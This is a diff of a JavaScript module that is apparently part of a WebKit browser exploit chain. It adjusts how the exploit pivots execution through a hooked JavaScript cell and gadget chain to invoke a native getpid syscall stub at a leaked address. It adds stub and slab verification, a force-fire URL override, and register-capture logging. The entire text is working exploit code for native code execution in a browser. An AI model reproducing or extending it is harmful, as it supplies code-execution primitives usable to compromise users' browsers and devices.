@@ -3,7 +3,8 @@
  */
 import { int64 } from "./int64.js";
 import {
-    prepNativeChain, firePivotGetpid, fireNativeCall,
+    prepNativeChain, fireNativeCall,
+    stageGetpid, verifySlabContent,
     stageNotify, fireNotifyDevWrite, bisectDisarmG0, bisectRestorePivotOnly,
     primeCallFrame, readCallRetDetailed,
 } from "./native_call.js?v=nc-20250901h";
@@ -109,32 +110,30 @@ export function resolveG0GetpidStubOff(p, lk, off, opts) {
                 };
             }
         }
-        if (off.k_stubs && off.k_stubs[20] != null) {
-            const woff = off.k_stubs[20];
-            return {
-                stubOff: woff,
-                mode: "raw",
-                tag: "fallback-wrap-cand+0x" + woff.toString(16),
-                verified: false,
-                peek: peekStubWord(p, lk, woff),
-            };
-        }
     }
 
     return {
-        stubOff: sc,
+        stubOff: null,
         mode: "raw",
-        tag: "blind-syscall+0x" + sc.toString(16),
+        tag: "no-verified-stub",
         verified: false,
         peek: null,
     };
 }
 
-/** raw: pid > 0; wrap: legacy errno-style 0 = OK. */
+/** WebKit userland pid must be >0 (swapper pid 0 is kernel-only — not us). */
 export function getpidRetOk(ret, mode) {
     ret = ret | 0;
     if (mode === "wrap") return ret === 0;
     return ret > 0;
+}
+
+function explainGetpidZero(cap, storeMiss) {
+    if (storeMiss)
+        return "frame still 0xCAFEBABE — rax never stored (MOV [rdi],rax / gadget F)";
+    if (cap.memLo === 0 && cap.dvLo === 0)
+        return "rax=0 stored — not WebKit pid (swapper=0 is kernel idle, not browser)";
+    return "unexpected frame mem=0x" + cap.memLo.toString(16);
 }
 
 export function g0AlreadyFired() {
@@ -291,7 +290,7 @@ export function fireG0Smoke(p, off, opts) {
     return { path: "g0-smoke", cap };
 }
 
-/** G0 + cell30 hook + getpid — auto-verified syscall (want pid > 0). */
+/** G0 + cell30 hook + getpid — verified syscall stub, want pid > 0. */
 export function fireG0Getpid(p, off, lk, opts) {
     opts = opts || {};
     if (!lk) throw new Error("g0 getpid: need lk");
@@ -299,42 +298,60 @@ export function fireG0Getpid(p, off, lk, opts) {
         throw new Error("g0: already fired — reload tab before refire");
     const prep = ensureG0Prep(p, off, lk, opts);
     const stub = resolveG0GetpidStubOff(p, lk, off, opts);
+    const force = opts.forceUnverified
+        || (typeof location !== "undefined"
+            && new URLSearchParams(location.search).get("force") === "1");
+    if (stub.stubOff == null) {
+        throw new Error("getpid: no verified stub @ lk — try ?getpid=scan, re-2e lk, "
+            + "or blind ?getpid=raw&force=1 (pid=0 is not swapper — frame/stub miss)");
+    }
+    if (!stub.verified && !force && stub.mode === "raw") {
+        throw new Error("getpid: stub " + stub.tag + " unverified — add &force=1 to blind-fire");
+    }
     stubStep(opts, "G0-GETPID-STUB", stub.tag
         + (stub.verified ? " VERIFIED" : " UNVERIFIED")
         + (stub.peek ? " peek=" + stub.peek : "")
         + " lk=" + lk);
     stubStep(opts, "G0-GETPID-FIRE", stub.mode === "raw"
         ? "want pid>0 @ +0x" + stub.stubOff.toString(16)
-        : "wrap want ret=0");
-    primeCallFrame(p, prep, GETPID_FRAME_CANARY);
-    const ret = firePivotGetpid(p, prep, lk, off, stub.stubOff, {
+        : " wrap want ret=0");
+    const fireOpts = {
         hook: opts.hook || "cell30",
         carrier: opts.carrier || null,
-        skipVerify: opts.skipVerify === true,
-    });
+    };
+    stageGetpid(p, prep, lk, off, stub.stubOff, fireOpts);
+    if (!opts.skipVerify) {
+        const content = verifySlabContent(p, prep);
+        if (!content.ok)
+            throw new Error("getpid slab: " + content.reasons.join("; "));
+    }
+    primeCallFrame(p, prep, GETPID_FRAME_CANARY);
+    const got = fireNativeCall(p, prep, off, fireOpts);
     const cap = readCallRetDetailed(p, prep);
-    const got = cap.ret;
-    const storeMiss = (got === 0 && cap.memLo === GETPID_FRAME_CANARY);
+    const ret = cap.ret;
+    const storeMiss = cap.memLo === GETPID_FRAME_CANARY;
     stubStep(opts, "GETPID-CAP",
-        "ret=" + got + " dv=0x" + cap.dvLo.toString(16)
+        "rax=0x" + cap.memHi.toString(16) + cap.memLo.toString(16)
+        + " dv=0x" + cap.dvLo.toString(16)
         + " mem=0x" + cap.memLo.toString(16)
-        + (storeMiss ? " STORE-MISS" : ""));
+        + (storeMiss ? " STORE-MISS" : " stored"));
+    if (!getpidRetOk(ret, stub.mode))
+        stubStep(opts, "GETPID-ZERO", explainGetpidZero(cap, storeMiss));
     postFireCleanup(p, prep, opts);
     markG0Fired("getpid");
-    const ok = getpidRetOk(got, stub.mode);
+    const ok = getpidRetOk(ret, stub.mode);
     const doneDetail = stub.mode === "raw"
-        ? "pid=" + got + (ok ? " OK" : " BAD")
-        + (storeMiss ? " (frame not stored?)" : "")
-        : "wrap-ret=" + got + (ok ? " OK" : " fail");
+        ? "pid=" + ret + (ok ? " OK" : " BAD")
+        : "wrap-ret=" + ret + (ok ? " OK" : " fail");
     stubStep(opts, "G0-DONE", doneDetail);
     try {
         sessionStorage.setItem("wk-native-getpid-ok",
-            (stub.mode === "raw" ? "pid=" : "wrap=") + got + "@" + Date.now());
+            (stub.mode === "raw" ? "pid=" : "wrap=") + ret + "@" + Date.now());
     } catch (_) { }
     return {
         path: "g0-getpid",
-        ret: got,
-        pid: stub.mode === "raw" ? got : null,
+        ret,
+        pid: stub.mode === "raw" ? ret : null,
         mode: stub.mode,
         stubOff: stub.stubOff,
         verified: stub.verified,
